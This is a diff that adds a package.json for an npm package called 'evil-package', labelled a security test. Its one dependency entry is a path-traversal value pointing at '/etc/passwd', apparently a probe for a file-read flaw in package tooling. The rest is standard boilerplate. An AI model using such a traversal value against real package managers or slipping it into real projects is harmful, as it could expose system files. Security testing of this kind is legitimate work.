@@ -1,0 +1,22 @@
+{
+  "name": "evil-package",
+  "version": "1.0.0",
+  "description": "security test",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "dependencies": {
+    "evil": "../../../../../../../../etc/passwd"
+  },
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/No1zy/evil-package.git"
+  },
+  "author": "",
+  "license": "ISC",
+  "bugs": {
+    "url": "https://github.com/No1zy/evil-package/issues"
+  },
+  "homepage": "https://github.com/No1zy/evil-package#readme"
+}
